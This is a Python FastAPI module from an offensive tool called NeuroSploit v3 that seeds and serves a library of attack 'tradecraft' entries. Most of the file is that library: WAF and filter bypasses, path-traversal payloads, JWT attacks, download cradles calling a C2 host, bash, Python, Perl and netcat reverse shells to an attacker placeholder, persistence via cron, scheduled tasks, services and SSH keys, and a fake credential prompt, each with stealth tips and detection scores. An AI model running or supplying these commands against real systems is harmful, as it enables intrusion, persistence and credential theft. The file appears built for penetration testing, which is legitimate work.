"""
NeuroSploit v3 - Tradecraft TTP API Endpoints
"""
from typing import Optional, List
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from backend.db.database import get_db
from backend.models.tradecraft import Tradecraft, ScanTradecraft
from backend.schemas.tradecraft import (
    TradecraftCreate, TradecraftUpdate, TradecraftResponse, TradecraftToggle
)

router = APIRouter()

# 12 built-in starter TTPs
BUILTIN_TRADECRAFT = [
    {
        "name": "WAF Bypass Techniques",
        "category": "evasion",
        "description": "Techniques for detecting and bypassing Web Application Firewalls",
        "content": (
            "When encountering a WAF, apply the following bypass strategies:\n"
            "1. Use case alternation in payloads (e.g., SeLeCt instead of SELECT)\n"
            "2. Encode payloads with double URL-encoding, Unicode, and hex encoding\n"
            "3. Insert inline comments within SQL/XSS payloads (e.g., SEL/**/ECT)\n"
            "4. Use HTTP parameter fragmentation to split malicious input across multiple parameters\n"
            "5. Try alternative HTTP methods (PUT, PATCH) that may bypass WAF rules\n"
            "6. Use chunked transfer encoding to evade pattern matching\n"
            "7. Test with null bytes and overlong UTF-8 sequences"
        ),
    },
    {
        "name": "Encoding & Obfuscation",
        "category": "evasion",
        "description": "Payload encoding and obfuscation to evade input filters",
        "content": (
            "Apply layered encoding to bypass input sanitization:\n"
            "1. Base64 encode payloads where the application decodes them server-side\n"
            "2. Use HTML entity encoding for XSS payloads (&#x3C;script&#x3E;)\n"
            "3. Apply double URL encoding (%2527 instead of %27)\n"
            "4. Use JavaScript Unicode escapes (\\u0061lert) in XSS contexts\n"
            "5. Try JSFuck or equivalent encodings for JavaScript execution\n"
            "6. Use octal/hex encoding in path traversal (..\\x2f or ..%c0%af)\n"
            "7. Attempt overlong UTF-8 representations of special characters"
        ),
    },
    {
        "name": "HTTP Parameter Pollution",
        "category": "evasion",
        "description": "Exploit parameter parsing differences to bypass security controls",
        "content": (
            "Test for HTTP Parameter Pollution (HPP) vulnerabilities:\n"
            "1. Submit duplicate parameters with different values (e.g., id=1&id=2) and observe which value the app uses\n"
            "2. Mix parameter locations: URL query string vs POST body vs cookies\n"
            "3. Test parameter precedence differences between frontend validation and backend processing\n"
            "4. Use HPP to bypass WAF rules by splitting payloads across duplicate parameters\n"
            "5. Check if arrays are supported (param[]=val1&param[]=val2) and test for injection in each element\n"
            "6. Try JSON body with duplicate keys to test parser behavior"
        ),
    },
    {
        "name": "HTTP Method Tampering",
        "category": "evasion",
        "description": "Exploit inconsistent HTTP method handling to bypass access controls",
        "content": (
            "Test for HTTP method-based access control bypasses:\n"
            "1. Replace GET with POST and vice versa on protected endpoints\n"
            "2. Try HEAD, OPTIONS, PATCH, PUT, DELETE on restricted resources\n"
            "3. Use X-HTTP-Method-Override, X-Method-Override, or X-HTTP-Method headers\n"
            "4. Test TRACE method for potential credential leakage via headers\n"
            "5. Send CONNECT or custom methods to check for unexpected behavior\n"
            "6. Verify that method-level access controls are consistently enforced across all endpoints"
        ),
    },
    {
        "name": "Auth Token Manipulation",
        "category": "exploitation",
        "description": "Techniques for testing authentication token security",
        "content": (
            "Test authentication token integrity and handling:\n"
            "1. Decode JWT tokens and check for weak algorithms (none, HS256 with known secrets)\n"
            "2. Attempt JWT algorithm confusion attacks (switch RS256 to HS256)\n"
            "3. Modify JWT claims (user ID, role, email) and re-sign with weak/guessed keys\n"
            "4. Test token expiration - use expired tokens, tokens with far-future expiry\n"
            "5. Check if tokens are invalidated on password change or logout\n"
            "6. Attempt session fixation by setting session cookies before authentication\n"
            "7. Test for token leakage in URL parameters, Referer headers, or error messages"
        ),
    },
    {
        "name": "Rate Limit Bypass",
        "category": "evasion",
        "description": "Techniques for evading rate limiting and throttling mechanisms",
        "content": (
            "Attempt to bypass rate limiting controls:\n"
            "1. Add X-Forwarded-For, X-Real-IP, X-Originating-IP headers with varying IPs\n"
            "2. Rotate User-Agent strings between requests\n"
            "3. Use different API versions or endpoint aliases for the same resource\n"
            "4. Test if rate limits are per-endpoint or global (try different paths to same function)\n"
            "5. Add null bytes or path variations (/api/login vs /api/login/ vs /api/./login)\n"
            "6. Check if changing case bypasses rate limits (/API/Login vs /api/login)\n"
            "7. Test if rate limits reset when switching between HTTP and HTTPS"
        ),
    },
    {
        "name": "Path Traversal Variations",
        "category": "exploitation",
        "description": "Advanced path traversal techniques beyond basic ../ sequences",
        "content": (
            "Test for path traversal using multiple encoding and bypass techniques:\n"
            "1. Standard traversal: ../../../etc/passwd\n"
            "2. URL encoded: %2e%2e%2f%2e%2e%2f\n"
            "3. Double URL encoded: %252e%252e%252f\n"
            "4. Unicode/UTF-8: ..%c0%af or ..%ef%bc%8f\n"
            "5. Null byte injection: ../../../../etc/passwd%00.png\n"
            "6. OS-specific: ....// or ..\\..\\..\\  (Windows backslash)\n"
            "7. Absolute path: /etc/passwd or C:\\Windows\\system.ini\n"
            "8. Wrapper protocols: file:///etc/passwd, php://filter/convert.base64-encode\n"
            "9. Long path bypass: /../../../../../../../../../etc/passwd"
        ),
    },
    {
        "name": "CORS Probing",
        "category": "reconnaissance",
        "description": "Systematic CORS misconfiguration detection",
        "content": (
            "Probe for CORS misconfigurations that could allow cross-origin attacks:\n"
            "1. Set Origin header to attacker-controlled domain and check for Access-Control-Allow-Origin reflection\n"
            "2. Test null origin: Origin: null (often whitelisted for local file access)\n"
            "3. Try subdomain matching: if example.com is allowed, test evil-example.com and example.com.evil.com\n"
            "4. Check if credentials are allowed with wildcard origins (Access-Control-Allow-Credentials: true)\n"
            "5. Test pre-flight request handling for custom headers and methods\n"
            "6. Verify Access-Control-Expose-Headers doesn't leak sensitive headers\n"
            "7. Check if internal/admin endpoints have more permissive CORS policies"
        ),
    },
    {
        "name": "Cache Poisoning",
        "category": "exploitation",
        "description": "Web cache poisoning and deception techniques",
        "content": (
            "Test for web cache poisoning vulnerabilities:\n"
            "1. Identify unkeyed inputs: headers (X-Forwarded-Host, X-Forwarded-Scheme), cookies, query params\n"
            "2. Inject XSS payloads via unkeyed headers that reflect in cached responses\n"
            "3. Test cache key normalization: /page vs /PAGE vs /page?\n"
            "4. Attempt cache deception: trick the cache into storing authenticated responses for public URLs\n"
            "5. Use path confusion: /static/cached-page/..%2f../private-data\n"
            "6. Test for Host header injection that gets cached\n"
            "7. Check CDN-specific behaviors (vary header handling, cache tags)"
        ),
    },
    {
        "name": "Subdomain & VHost Discovery",
        "category": "reconnaissance",
        "description": "Discover hidden subdomains and virtual hosts",
        "content": (
            "Enumerate subdomains and virtual hosts to expand attack surface:\n"
            "1. Brute-force common subdomain names (api, dev, staging, admin, internal, test)\n"
            "2. Check DNS records: CNAME chains, TXT records with SPF/DKIM info, MX records\n"
            "3. Test virtual host routing by setting Host header to variations of the target domain\n"
            "4. Check for subdomain takeover: CNAME pointing to unclaimed services (S3, Heroku, GitHub Pages)\n"
            "5. Use certificate transparency logs to discover historical subdomains\n"
            "6. Check for wildcard DNS and test non-existent subdomains for default responses\n"
            "7. Look for internal hostnames leaked in error messages, HTML comments, or JavaScript files"
        ),
    },
    {
        "name": "Error-Based Disclosure",
        "category": "reconnaissance",
        "description": "Extract sensitive information from application error responses",
        "content": (
            "Trigger and analyze error responses for information disclosure:\n"
            "1. Send malformed input (long strings, special characters, unexpected types) to trigger verbose errors\n"
            "2. Check if stack traces reveal framework versions, file paths, or database types\n"
            "3. Test for different error behavior in debug vs production mode\n"
            "4. Look for SQL error messages that reveal database structure (table names, column names)\n"
            "5. Trigger 404/500 errors on various paths to identify server software and version\n"
            "6. Check error responses for internal IP addresses, hostnames, or API keys\n"
            "7. Test numeric overflow, null values, and empty strings on each parameter"
        ),
    },
    {
        "name": "Business Logic Bypass",
        "category": "validation",
        "description": "Test for business logic flaws and workflow bypasses",
        "content": (
            "Test for business logic vulnerabilities in application workflows:\n"
            "1. Skip steps in multi-step processes (go directly to payment confirmation)\n"
            "2. Test negative values, zero amounts, and extreme quantities in financial operations\n"
            "3. Modify client-side price/discount calculations before submission\n"
            "4. Test race conditions: send concurrent requests to exploit TOCTOU vulnerabilities\n"
            "5. Check if role-based restrictions can be bypassed by manipulating request parameters\n"
            "6. Test IDOR by modifying resource IDs in API calls to access other users' data\n"
            "7. Verify that server-side validation matches client-side validation\n"
            "8. Test if disabled form fields are still processed server-side"
        ),
    },

    # ===== LOLBin Tradecraft (23 entries) =====

    # --- Windows LOLBins (10) ---
    {
        "name": "LOLBin: PowerShell Download Cradle",
        "category": "evasion",
        "description": "Use PowerShell to download files and execute commands stealthily",
        "content": (
            "PowerShell download cradle techniques for file staging and C2:\n"
            "1. IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')\n"
            "2. powershell -enc <base64> for obfuscated execution\n"
            "3. Use -WindowStyle Hidden for stealth\n"
            "4. Split commands across multiple invocations to avoid detection\n\n"
            "MITRE ATT&CK: T1059.001, T1105\n"
            "Detection Profile: AV=0.3, IDS=0.4, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.5, Traffic=0.6, Logs=0.7, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: CertUtil File Download",
        "category": "evasion",
        "description": "Abuse CertUtil to download files bypassing restrictions",
        "content": (
            "CertUtil download bypass techniques:\n"
            "1. certutil -urlcache -f http://c2/payload output.txt\n"
            "2. certutil -encode data.txt data.b64 (encoding for exfil)\n"
            "3. certutil -decode data.b64 data.exe (decode staged payloads)\n\n"
            "MITRE ATT&CK: T1105, T1140\n"
            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.4, Traffic=0.5, Logs=0.6, Memory=0.2"
        ),
    },
    {
        "name": "LOLBin: BITSAdmin Transfer",
        "category": "evasion",
        "description": "Use BITS service for stealthy background file transfers",
        "content": (
            "BITSAdmin background transfer for payload staging:\n"
            "1. bitsadmin /transfer job /download /priority normal URL LOCAL\n"
            "2. Transfers survive reboots and run in background\n"
            "3. Use low priority to blend with Windows Update traffic\n\n"
            "MITRE ATT&CK: T1105, T1197\n"
            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.3, Traffic=0.4, Logs=0.5, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: MSBuild Code Execution",
        "category": "evasion",
        "description": "Execute code via MSBuild XML project files to bypass whitelisting",
        "content": (
            "MSBuild execution for application whitelisting bypass:\n"
            "1. Create .csproj with inline C# code in <Task> element\n"
            "2. msbuild.exe project.csproj executes embedded code\n"
            "3. Signed Microsoft binary - trusted by default\n\n"
            "MITRE ATT&CK: T1127.001\n"
            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.3, Traffic=0.1, Logs=0.4, Memory=0.2"
        ),
    },
    {
        "name": "LOLBin: RegSvr32 Scriptlet",
        "category": "evasion",
        "description": "Execute scripts via RegSvr32 scriptlets for defense evasion",
        "content": (
            "RegSvr32 scriptlet execution bypass:\n"
            "1. regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll\n"
            "2. Downloads and executes remote .sct scriptlets\n"
            "3. Proxy-aware, bypasses application whitelisting\n\n"
            "MITRE ATT&CK: T1218.010\n"
            "Detection Profile: AV=0.25, IDS=0.3, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.4, Traffic=0.5, Logs=0.5, Memory=0.2"
        ),
    },
    {
        "name": "LOLBin: WMI Remote Execution",
        "category": "exploitation",
        "description": "Execute commands remotely via WMI for lateral movement",
        "content": (
            "WMI-based lateral movement and remote execution:\n"
            "1. wmic /node:TARGET process call create 'cmd.exe /c COMMAND'\n"
            "2. WMI event subscriptions for persistence\n"
            "3. WMI queries for host discovery and enumeration\n\n"
            "MITRE ATT&CK: T1047, T1569.002\n"
            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.4, Traffic=0.4, Logs=0.6, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: Scheduled Task Persistence",
        "category": "exploitation",
        "description": "Create scheduled tasks for persistent access and execution",
        "content": (
            "Scheduled task persistence techniques:\n"
            "1. schtasks /create /tn 'TaskName' /tr 'cmd.exe /c COMMAND' /sc daily\n"
            "2. Use legitimate-sounding task names (GoogleUpdate, WindowsDefender)\n"
            "3. Set triggers during business hours to blend in\n\n"
            "MITRE ATT&CK: T1053.005\n"
            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.3, Traffic=0.1, Logs=0.7, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: SC Service Creation",
        "category": "exploitation",
        "description": "Create Windows services for persistence with SC.exe",
        "content": (
            "Windows service persistence via sc.exe:\n"
            "1. sc create ServiceName binPath= 'cmd.exe /c COMMAND' start= auto\n"
            "2. Services auto-start on boot with SYSTEM privileges\n"
            "3. Use legitimate service names for stealth\n\n"
            "MITRE ATT&CK: T1543.003\n"
            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.4, Traffic=0.1, Logs=0.8, Memory=0.2"
        ),
    },
    {
        "name": "LOLBin: Rundll32 DLL Execution",
        "category": "evasion",
        "description": "Execute DLL functions via Rundll32 for defense evasion",
        "content": (
            "Rundll32 DLL execution for whitelisting bypass:\n"
            "1. rundll32.exe payload.dll,EntryPoint\n"
            "2. rundll32.exe javascript:'..\\mshtml,...'\n"
            "3. Signed Windows binary, trusted by most EDR\n\n"
            "MITRE ATT&CK: T1218.011\n"
            "Detection Profile: AV=0.3, IDS=0.2, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.4, Traffic=0.2, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: NET Command Discovery",
        "category": "reconnaissance",
        "description": "Network and system discovery using NET commands",
        "content": (
            "NET command reconnaissance:\n"
            "1. net user - enumerate local users\n"
            "2. net group 'Domain Admins' /domain - find domain admins\n"
            "3. net view - discover network shares\n"
            "4. net localgroup administrators - list local admins\n\n"
            "MITRE ATT&CK: T1087.001, T1087.002, T1135\n"
            "Detection Profile: AV=0.05, IDS=0.1, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.2, Traffic=0.2, Logs=0.5, Memory=0.1"
        ),
    },

    # --- Linux LOLBins (10) ---
    {
        "name": "LOLBin: Bash Reverse Shell",
        "category": "exploitation",
        "description": "Create reverse shell connections using Bash built-ins",
        "content": (
            "Bash reverse shell techniques:\n"
            "1. bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n"
            "2. Use /dev/tcp for native socket without external tools\n"
            "3. Combine with nohup for persistence across terminal close\n\n"
            "MITRE ATT&CK: T1059.004, T1071.001\n"
            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: Curl/Wget Download",
        "category": "evasion",
        "description": "Download files via curl or wget for payload staging",
        "content": (
            "Curl/wget file staging techniques:\n"
            "1. curl http://c2/payload -o /tmp/payload\n"
            "2. wget http://c2/payload -O /tmp/payload -q (quiet mode)\n"
            "3. curl with --socks5 for proxy pivoting\n"
            "4. Use -k to ignore certificate errors for self-signed C2\n\n"
            "MITRE ATT&CK: T1105\n"
            "Detection Profile: AV=0.15, IDS=0.3, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.3, Traffic=0.5, Logs=0.4, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: Cron Job Persistence",
        "category": "exploitation",
        "description": "Create cron jobs for persistent scheduled execution",
        "content": (
            "Cron-based persistence:\n"
            "1. echo '* * * * * /tmp/backdoor.sh' | crontab -\n"
            "2. Write to /etc/cron.d/ for system-level crons\n"
            "3. Use @reboot directive for boot persistence\n\n"
            "MITRE ATT&CK: T1053.003\n"
            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.3, Traffic=0.1, Logs=0.6, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: SSH Key Persistence",
        "category": "exploitation",
        "description": "Add SSH authorized keys for persistent backdoor access",
        "content": (
            "SSH key persistence:\n"
            "1. echo 'ssh-rsa ATTACKER_KEY' >> ~/.ssh/authorized_keys\n"
            "2. Create new key pair and inject public key\n"
            "3. Set correct permissions (700 .ssh, 600 authorized_keys)\n\n"
            "MITRE ATT&CK: T1098.004\n"
            "Detection Profile: AV=0.05, IDS=0.1, EDR=0.2, Heuristic=0.1, "
            "Sandbox=0.2, Traffic=0.1, Logs=0.5, Memory=0.0"
        ),
    },
    {
        "name": "LOLBin: Python Reverse Shell",
        "category": "exploitation",
        "description": "Create reverse shell using Python interpreter",
        "content": (
            "Python reverse shell:\n"
            "1. python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n"
            "2. Works on most Linux systems with Python installed\n"
            "3. Use python3 on modern systems\n\n"
            "MITRE ATT&CK: T1059.006, T1071.001\n"
            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: Systemd Service Persistence",
        "category": "exploitation",
        "description": "Create systemd services for boot-persistent access",
        "content": (
            "Systemd service persistence:\n"
            "1. Create .service file in /etc/systemd/system/\n"
            "2. systemctl enable malicious.service\n"
            "3. Survives reboots, runs as configured user\n"
            "4. Use legitimate-sounding service names\n\n"
            "MITRE ATT&CK: T1543.002\n"
            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.3, Traffic=0.1, Logs=0.7, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: Find Command Discovery",
        "category": "reconnaissance",
        "description": "Discover sensitive files and directories using find",
        "content": (
            "File discovery with find:\n"
            "1. find / -name '*.conf' 2>/dev/null - configuration files\n"
            "2. find /home -name '*.key' -o -name 'id_rsa' - SSH keys\n"
            "3. find / -perm -4000 2>/dev/null - SUID binaries\n"
            "4. find / -writable -type d 2>/dev/null - writable directories\n\n"
            "MITRE ATT&CK: T1083\n"
            "Detection Profile: AV=0.0, IDS=0.0, EDR=0.2, Heuristic=0.1, "
            "Sandbox=0.2, Traffic=0.0, Logs=0.3, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: Netcat Listener",
        "category": "exploitation",
        "description": "Create bind/reverse shells and transfer files with netcat",
        "content": (
            "Netcat C2 and file transfer:\n"
            "1. nc -lvp 4444 -e /bin/bash (bind shell)\n"
            "2. nc ATTACKER PORT -e /bin/bash (reverse shell)\n"
            "3. nc -lvp 4444 > received_file (file transfer)\n\n"
            "MITRE ATT&CK: T1071.001\n"
            "Detection Profile: AV=0.15, IDS=0.5, EDR=0.6, Heuristic=0.5, "
            "Sandbox=0.6, Traffic=0.7, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: Perl Reverse Shell",
        "category": "exploitation",
        "description": "Create reverse shell using Perl interpreter",
        "content": (
            "Perl reverse shell:\n"
            "1. perl -e 'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n"
            "2. Available on many systems even without Python\n\n"
            "MITRE ATT&CK: T1059.006, T1071.001\n"
            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: SSH Tunneling",
        "category": "exploitation",
        "description": "Create SSH tunnels for pivoting and proxying",
        "content": (
            "SSH tunneling for lateral movement:\n"
            "1. ssh -L 8080:internal:80 user@jumphost (local forward)\n"
            "2. ssh -R 8080:localhost:80 user@jumphost (remote forward)\n"
            "3. ssh -D 1080 user@jumphost (SOCKS proxy)\n"
            "4. Use -N -f for background tunnels\n\n"
            "MITRE ATT&CK: T1021.004, T1090.001\n"
            "Detection Profile: AV=0.1, IDS=0.3, EDR=0.3, Heuristic=0.2, "
            "Sandbox=0.3, Traffic=0.4, Logs=0.5, Memory=0.2"
        ),
    },

    # --- macOS LOLBins (3) ---
    {
        "name": "LOLBin: LaunchAgent Persistence (macOS)",
        "category": "exploitation",
        "description": "Create LaunchAgents for persistent access on macOS",
        "content": (
            "macOS LaunchAgent persistence:\n"
            "1. Create .plist in ~/Library/LaunchAgents/\n"
            "2. launchctl load ~/Library/LaunchAgents/com.malicious.plist\n"
            "3. Runs at user login, survives reboots\n"
            "4. Use legitimate-sounding reverse-DNS names\n\n"
            "MITRE ATT&CK: T1543.001\n"
            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.3, Traffic=0.1, Logs=0.6, Memory=0.1"
        ),
    },
    {
        "name": "LOLBin: Python Reverse Shell (macOS)",
        "category": "exploitation",
        "description": "Create reverse shell using macOS Python interpreter",
        "content": (
            "macOS Python reverse shell:\n"
            "1. python3 -c 'import socket,subprocess,os;...'\n"
            "2. Python is pre-installed on most macOS systems\n"
            "3. Network connections from python are somewhat common\n\n"
            "MITRE ATT&CK: T1059.006, T1071.001\n"
            "Detection Profile: AV=0.25, IDS=0.4, EDR=0.5, Heuristic=0.4, "
            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
        ),
    },
    {
        "name": "LOLBin: AppleScript Execution (macOS)",
        "category": "evasion",
        "description": "Execute AppleScript via osascript for macOS operations",
        "content": (
            "macOS osascript execution:\n"
            "1. osascript -e 'do shell script \"COMMAND\"'\n"
            "2. osascript -e 'display dialog \"Fake Prompt\"' (credential harvest)\n"
            "3. Native macOS binary, trusted by Gatekeeper\n"
            "4. Can interact with macOS UI elements\n\n"
            "MITRE ATT&CK: T1059.002\n"
            "Detection Profile: AV=0.2, IDS=0.2, EDR=0.4, Heuristic=0.3, "
            "Sandbox=0.4, Traffic=0.2, Logs=0.5, Memory=0.2"
        ),
    },
]


async def seed_builtin_tradecraft(db: AsyncSession):
    """Idempotent seeder for built-in TTPs"""
    for ttp in BUILTIN_TRADECRAFT:
        result = await db.execute(
            select(Tradecraft).where(
                Tradecraft.name == ttp["name"],
                Tradecraft.is_builtin == True,
            )
        )
        if result.scalar_one_or_none() is None:
            db.add(Tradecraft(
                name=ttp["name"],
                description=ttp["description"],
                content=ttp["content"],
                category=ttp["category"],
                is_builtin=True,
                enabled=True,
            ))
    await db.commit()


@router.get("", response_model=List[TradecraftResponse])
async def list_tradecraft(
    category: Optional[str] = None,
    enabled: Optional[bool] = None,
    db: AsyncSession = Depends(get_db),
):
    """List all TTPs with optional filters"""
    query = select(Tradecraft).order_by(Tradecraft.category, Tradecraft.name)
    if category:
        query = query.where(Tradecraft.category == category)
    if enabled is not None:
        query = query.where(Tradecraft.enabled == enabled)
    result = await db.execute(query)
    return [TradecraftResponse.model_validate(t) for t in result.scalars().all()]


@router.post("", response_model=TradecraftResponse)
async def create_tradecraft(
    data: TradecraftCreate,
    db: AsyncSession = Depends(get_db),
):
    """Create a custom TTP"""
    ttp = Tradecraft(
        name=data.name,
        description=data.description,
        content=data.content,
        category=data.category,
        enabled=data.enabled,
        is_builtin=False,
    )
    db.add(ttp)
    await db.flush()
    await db.refresh(ttp)
    return TradecraftResponse.model_validate(ttp)


@router.get("/for-scan/{scan_id}", response_model=List[TradecraftResponse])
async def get_tradecraft_for_scan(
    scan_id: str,
    db: AsyncSession = Depends(get_db),
):
    """Get TTPs associated with a specific scan"""
    result = await db.execute(
        select(Tradecraft)
        .join(ScanTradecraft, ScanTradecraft.tradecraft_id == Tradecraft.id)
        .where(ScanTradecraft.scan_id == scan_id)
    )
    rows = result.scalars().all()
    if rows:
        return [TradecraftResponse.model_validate(t) for t in rows]
    # Fallback: return globally enabled TTPs
    result = await db.execute(
        select(Tradecraft).where(Tradecraft.enabled == True)
    )
    return [TradecraftResponse.model_validate(t) for t in result.scalars().all()]


@router.get("/{ttp_id}", response_model=TradecraftResponse)
async def get_tradecraft(
    ttp_id: str,
    db: AsyncSession = Depends(get_db),
):
    """Get a single TTP"""
    result = await db.execute(select(Tradecraft).where(Tradecraft.id == ttp_id))
    ttp = result.scalar_one_or_none()
    if not ttp:
        raise HTTPException(status_code=404, detail="TTP not found")
    return TradecraftResponse.model_validate(ttp)


@router.put("/{ttp_id}", response_model=TradecraftResponse)
async def update_tradecraft(
    ttp_id: str,
    data: TradecraftUpdate,
    db: AsyncSession = Depends(get_db),
):
    """Update a TTP. Built-in TTPs can only have their enabled field changed."""
    result = await db.execute(select(Tradecraft).where(Tradecraft.id == ttp_id))
    ttp = result.scalar_one_or_none()
    if not ttp:
        raise HTTPException(status_code=404, detail="TTP not found")

    if ttp.is_builtin:
        # Only allow toggling enabled for builtins
        if data.enabled is not None:
            ttp.enabled = data.enabled
        # Reject any other changes
        has_other = any(v is not None for k, v in data.model_dump().items() if k != "enabled")
        if has_other:
            raise HTTPException(status_code=400, detail="Built-in TTPs can only be enabled/disabled")
    else:
        update_data = data.model_dump(exclude_unset=True)
        for field, value in update_data.items():
            setattr(ttp, field, value)

    await db.flush()
    await db.refresh(ttp)
    return TradecraftResponse.model_validate(ttp)


@router.delete("/{ttp_id}")
async def delete_tradecraft(
    ttp_id: str,
    db: AsyncSession = Depends(get_db),
):
    """Delete a custom TTP. Built-in TTPs cannot be deleted."""
    result = await db.execute(select(Tradecraft).where(Tradecraft.id == ttp_id))
    ttp = result.scalar_one_or_none()
    if not ttp:
        raise HTTPException(status_code=404, detail="TTP not found")
    if ttp.is_builtin:
        raise HTTPException(status_code=400, detail="Built-in TTPs cannot be deleted")
    await db.delete(ttp)
    return {"message": "TTP deleted", "id": ttp_id}


@router.post("/toggle")
async def bulk_toggle_tradecraft(
    data: TradecraftToggle,
    db: AsyncSession = Depends(get_db),
):
    """Bulk enable/disable TTPs"""
    result = await db.execute(
        select(Tradecraft).where(Tradecraft.id.in_(data.ids))
    )
    ttps = result.scalars().all()
    updated = 0
    for ttp in ttps:
        ttp.enabled = data.enabled
        updated += 1
    await db.flush()
    return {"message": f"Updated {updated} TTPs", "enabled": data.enabled}
